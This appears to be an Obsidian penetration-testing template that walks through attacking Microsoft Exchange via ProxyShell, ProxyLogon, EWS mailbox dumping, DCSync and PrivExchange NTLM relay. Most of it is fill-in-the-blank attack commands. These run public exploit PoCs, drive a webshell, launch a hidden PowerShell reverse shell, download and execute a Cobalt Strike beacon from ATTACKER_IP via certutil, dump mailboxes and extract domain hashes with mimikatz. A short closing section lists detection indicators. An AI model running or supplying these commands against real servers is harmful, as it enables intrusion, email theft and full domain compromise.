---
# Attack-specific fields
exchange_server:
exchange_fqdn:
exchange_version:
ews_url:
target_email:
webshell_path:
proxyshell_action: recon
notes:
---

# Exchange / ProxyShell Attacks

> [!abstract] Attack Summary
> **ProxyShell** (CVE-2021-34473 / CVE-2021-34523 / CVE-2021-31207) is a chain of three vulnerabilities in Microsoft Exchange allowing unauthenticated RCE via the Autodiscover endpoint. Combined with **ProxyLogon** (CVE-2021-26855) and Exchange Web Services (EWS) abuse, Exchange servers are high-value targets for initial access, email access, and internal network pivoting.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["Username", b?.username ?? "—"],
  ["Password", b?.password ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const actions = ["recon","proxyshell_rce","proxylogon","ews_enum","ews_email_dump","webshell_upload"];
const actionOptions = actions.map(a => `option(${a})`).join(',');

dv.table(["Field", "Value"], [
  ["Exchange Server IP",    `\`INPUT[text:exchange_server]\``],
  ["Exchange FQDN",         `\`INPUT[text:exchange_fqdn]\``],
  ["EWS URL",               `\`INPUT[text:ews_url]\``],
  ["Target Email",          `\`INPUT[text:target_email]\``],
  ["Web Shell Path",        `\`INPUT[text:webshell_path]\``],
  ["Action",                `\`INPUT[inlineSelect(defaultValue(${p.proxyshell_action ?? 'recon'}),${actionOptions}):proxyshell_action]\``],
]);
```

> [!info] Exchange Versions
> - **Exchange 2013** (15.0.x) — ProxyShell affected (fully patched by KB5001779)
> - **Exchange 2016** (15.1.x) — ProxyShell affected (fully patched by KB5001779)
> - **Exchange 2019** (15.2.x) — ProxyShell affected (fully patched by KB5001779)
> - **Exchange 2010** — ProxyLogon NOT affected (different auth path); ProxyShell does NOT apply

---

## Step 1 — Reconnaissance and Version Detection

**Linux — Identify Exchange and version**
```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const exchServer = p?.exchange_server || "EXCHANGE_IP";
const exchFqdn   = p?.exchange_fqdn  || "mail.domain.local";
dv.paragraph("```bash\n# Identify Exchange version via OWA headers\ncurl -sk https://" + exchFqdn + "/owa/ -I | grep -i 'x-owa-version\\|server\\|x-ms-exchange'\n\n# Check Autodiscover endpoint (ProxyShell entry point)\ncurl -sk https://" + exchFqdn + "/autodiscover/autodiscover.json?@evil.com/autodiscover/autodiscover.json?\\#@evil.com -v\n\n# Nmap version scan\nnmap -sV -p 443,80,25,587 " + exchServer + " --script=http-headers,ssl-cert\n\n# Check EWS\ncurl -sk https://" + exchFqdn + "/ews/exchange.asmx -I\n```");
```

**Windows — Basic recon**
```dataviewjs
const p = dv.current();
const exchFqdn = p?.exchange_fqdn || "mail.domain.local";
dv.paragraph("```powershell\n# Get Exchange server from AD\nGet-ADObject -Filter {objectClass -eq 'msExchExchangeServer'} -Properties * | Select Name,msExchProductID\n\n# Or from Exchange shell (if on Exchange server)\nGet-ExchangeServer | Select Name,Edition,AdminDisplayVersion\n\n# Find Exchange servers via SPN\nGet-ADUser -Filter * -Properties ServicePrincipalNames | Where-Object {$_.ServicePrincipalNames -match 'exchangeMDB'} | Select Name,ServicePrincipalNames\n```");
```

Exchange IP: `INPUT[text:exchange_server]` | FQDN: `INPUT[text:exchange_fqdn]`

---

## Step 2 — ProxyShell RCE (CVE-2021-34473/34523/31207)

> [!warning] ProxyShell chains three bugs:
> 1. **CVE-2021-34473** — Path confusion for SSRF to backend (pre-auth)
> 2. **CVE-2021-34523** — Elevation of privilege in Exchange PowerShell backend
> 3. **CVE-2021-31207** — Arbitrary file write via mailbox export (leads to webshell)

**Linux — ProxyShell exploit (Python)**
```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const exchFqdn  = p?.exchange_fqdn   || "mail.domain.local";
const targetEmail = p?.target_email  || "administrator@domain.local";
const lhost     = b?.lhost           ?? "ATTACKER_IP";
const lport     = b?.lport           ?? "4444";
dv.paragraph("```bash\n# Clone ProxyShell PoC\ngit clone https://github.com/dmaasland/proxyshell-poc.git\ncd proxyshell-poc\npip3 install -r requirements.txt\n\n# Step 1: Enumerate email addresses (pre-auth)\npython3 proxyshell.py -u https://" + exchFqdn + "/ --enum\n\n# Step 2: Run full exploit to upload webshell\npython3 proxyshell.py -u https://" + exchFqdn + "/ -e '" + targetEmail + "'\n\n# Alternative: use testanull's PoC\npython3 proxyshell.py -url https://" + exchFqdn + " -email '" + targetEmail + "'\n\n# Webshell typically lands at:\n# https://" + exchFqdn + "/aspnet_client/<random>.aspx\n# https://" + exchFqdn + "/owa/auth/<random>.aspx\n```");
```

**Linux — Manual ProxyShell SSRF test**
```dataviewjs
const p = dv.current();
const exchFqdn = p?.exchange_fqdn || "mail.domain.local";
dv.paragraph("```bash\n# Test SSRF via Autodiscover endpoint (CVE-2021-34473)\n# The @evil.com path confusion causes Exchange to strip the domain and query /autodiscover/\ncurl -sk 'https://" + exchFqdn + "/autodiscover/autodiscover.json?@evil.com/autodiscover/autodiscover.json?#@evil.com' \\\n  -H 'Content-Type: application/json'\n\n# Successful SSRF returns 'X-CalculatedBETarget' or 'X-FEServer' headers\n# indicating the request hit the backend Exchange server\n\n# Test PowerShell endpoint (CVE-2021-34523 — auth bypass via X-Rps-CAT)\ncurl -sk 'https://" + exchFqdn + "/powershell/?X-Rps-CAT=<BASE64_TOKEN>' \\\n  -H 'Content-Type: application/json' -v\n```");
```

Web shell path: `INPUT[text:webshell_path]`

---

## Step 3 — Interact with Web Shell

```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const exchFqdn    = p?.exchange_fqdn    || "mail.domain.local";
const webshell    = p?.webshell_path    || "/aspnet_client/shell.aspx";
const lhost       = b?.lhost            ?? "ATTACKER_IP";
const lport       = b?.lport            ?? "4444";
dv.paragraph("```bash\n# Interact with dropped webshell\ncurl -sk 'https://" + exchFqdn + webshell + "' \\\n  --data 'cmd=whoami'\n\n# Check Exchange server identity\ncurl -sk 'https://" + exchFqdn + webshell + "' \\\n  --data 'cmd=hostname+%26+whoami+%26+ipconfig'\n\n# Spawn reverse shell (PowerShell one-liner)\ncurl -sk 'https://" + exchFqdn + webshell + "' \\\n  --data-urlencode 'cmd=powershell -nop -w hidden -enc <BASE64_REVSHELL>'\n\n# Or upload a Cobalt Strike stager via certutil\ncurl -sk 'https://" + exchFqdn + webshell + "' \\\n  --data-urlencode 'cmd=certutil -urlcache -split -f http://" + lhost + ":" + lport + "/beacon.exe C:\\\\Windows\\\\Temp\\\\beacon.exe && C:\\\\Windows\\\\Temp\\\\beacon.exe'\n```");
```

---

## Step 4 — ProxyLogon (CVE-2021-26855) — Pre-Auth SSRF

> [!info] ProxyLogon bypasses authentication via SSRF through the Exchange Client Access Service. Combined with CVE-2021-27065 (arbitrary file write), it achieves pre-auth RCE on Exchange 2010–2019.

```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const exchServer = p?.exchange_server || "EXCHANGE_IP";
const exchFqdn   = p?.exchange_fqdn   || "mail.domain.local";
const lhost      = b?.lhost           ?? "ATTACKER_IP";
dv.paragraph("```bash\n# ProxyLogon PoC — SSRF to access Exchange backend as SYSTEM\ngit clone https://github.com/hausec/ProxyLogon\ncd ProxyLogon\n\n# Scan for vulnerable Exchange servers\npython3 proxylogon.py " + exchServer + "\n\n# Full exploit with webshell\npython3 proxylogon.py " + exchServer + " --shell\n\n# Alternative: using nuclei templates\nnuclei -target https://" + exchFqdn + " -t cves/2021/CVE-2021-26855.yaml\n\n# msf (if available)\n# use exploit/windows/http/exchange_proxylogon_rce\n# set RHOSTS " + exchServer + "\n# run\n```");
```

---

## Step 5 — EWS Email Enumeration and Dump

> [!info] Exchange Web Services (EWS) allows programmatic access to mailboxes. With valid credentials (or as SYSTEM via webshell), you can enumerate and dump emails.

**Linux — EWS enumeration with ruler/ews-crack**
```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const exchFqdn = p?.exchange_fqdn || "mail.domain.local";
const targetEmail = p?.target_email || "administrator@domain.local";
dv.paragraph("```bash\n# Enumerate mailboxes with credentials via EWS\npython3 -m impacket.examples.findDelegation " + domain + "/" + username + ":'" + password + "' -dc-ip " + (b?.dc_ip ?? "DC_IP") + "\n\n# Use ruler to access EWS\nruler --url https://" + exchFqdn + "/autodiscover/autodiscover.xml \\\n  --email " + targetEmail + " \\\n  --username " + domain + "\\\\" + username + " \\\n  --password '" + password + "' \\\n  display\n\n# Dump emails with EWS (Python ewstools)\npip3 install exchangelib\npython3 -c \"\nimport exchangelib\ncreds = exchangelib.Credentials('" + domain + "\\\\" + username + "', '" + password + "')\nconfig = exchangelib.Configuration(server='" + exchFqdn + "', credentials=creds)\nacc = exchangelib.Account('" + targetEmail + "', config=config, autodiscover=False, access_type=exchangelib.DELEGATE)\nfor item in acc.inbox.all().order_by('-datetime_received')[:20]:\n    print(item.subject, item.sender)\n\"\n```");
```

**Linux — NetExec EWS enumeration**
```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const exchServer = p?.exchange_server || "EXCHANGE_IP";
dv.paragraph("```bash\n# NetExec EWS module\nnxc http " + exchServer + " -u '" + username + "' -p '" + password + "' -d '" + domain + "' --module ews-enum\n\n# MailSniper (if Windows available) — from attacker's PS session\nInvoke-PasswordSprayEWS -ExchHostname " + exchServer + " -UserList users.txt -Password '" + password + "' -Verbose\n\nGet-GlobalAddressList -ExchHostname " + exchServer + " -UserName '" + domain + "\\\\" + username + "' -Password '" + password + "' -OutFile gal.txt\n\n# Dump inbox\nGet-EWSFolderItems -ExchHostname " + exchServer + " -UserName '" + domain + "\\\\" + username + "' -Password '" + password + "' -EmailAddress '" + (p?.target_email || "target@domain.local") + "'\n```");
```

---

## Step 6 — Post-Exploitation from Exchange Server

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain = b?.domain ?? "DOMAIN";
dv.paragraph("```powershell\n# Exchange runs as SYSTEM — extract credentials\n# Dump LSA secrets / NTDS directly\n\n# From webshell as SYSTEM:\n# Check if Exchange has AD rights (often Exchange Windows Permissions has WriteDACL on domain)\nGet-ADGroupMember 'Exchange Windows Permissions'\nGet-ADGroupMember 'Exchange Trusted Subsystem'\n\n# Exchange Trusted Subsystem members can perform DCSync!\n# Add your user to Exchange Windows Permissions group\nAdd-ADGroupMember -Identity 'Exchange Windows Permissions' -Members USERNAME\n\n# Then grant DCSync rights\nAdd-DomainObjectAcl -TargetIdentity '" + domain + "' -PrincipalIdentity USERNAME -Rights DCSync\n\n# DCSync!\nmimikatz lsadump::dcsync /domain:" + domain + " /all /csv\n```");
```

---

## Step 7 — NTLM Relay via Exchange (PrivExchange)

> [!info] **PrivExchange** (CVE-2019-0686): Exchange server can be coerced to authenticate to an attacker via EWS PushSubscription, then relay to LDAP to grant DCSync rights. Patched but worth checking on older environments.

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const lhost    = b?.lhost    ?? "ATTACKER_IP";
const p = dv.current();
const exchFqdn = p?.exchange_fqdn || "mail.domain.local";
dv.paragraph("```bash\n# Step 1: Start ntlmrelayx targeting DC LDAP\nimpacket-ntlmrelayx -t ldap://" + dc_ip + " --escalate-user " + username + " -smb2support\n\n# Step 2: Trigger Exchange to authenticate to attacker\npython3 privexchange.py -ah " + lhost + " " + exchFqdn + " -u '" + username + "' -p '" + password + "' -d '" + domain + "'\n\n# ntlmrelayx will relay Exchange's authentication and grant DCSync rights to your user\n# Then DCSync\nimpacket-secretsdump " + domain + "/" + username + ":'" + password + "'@" + dc_ip + " -just-dc\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - ProxyShell exploitation: **HTTP 200 on /autodiscover/autodiscover.json** with `@evil.com` in path — highly anomalous.
> - Web shell creation: **Event 4663** (file creation in Exchange web directories) and IIS logs showing new `.aspx` file access.
> - ProxyLogon: unusual X-BEResource cookie values and backend request anomalies in Exchange logs.
> - EWS abuse: **Event 4624** (logon) from non-Outlook clients using EWS, particularly from new IPs.
> - PrivExchange: LDAP writes to the domain object (`nTSecurityDescriptor`) visible as **Event 5136**.
> - Exchange groups abuse: **Event 4728** (member added) to Exchange Windows Permissions / Trusted Subsystem groups.
> - **IIS Logs:** All ProxyShell/ProxyLogon exploitation leaves traces in `%ExchangeInstallPath%\Logging\HttpProxy\`.

---

## Notes & Results

`INPUT[textarea:notes]`
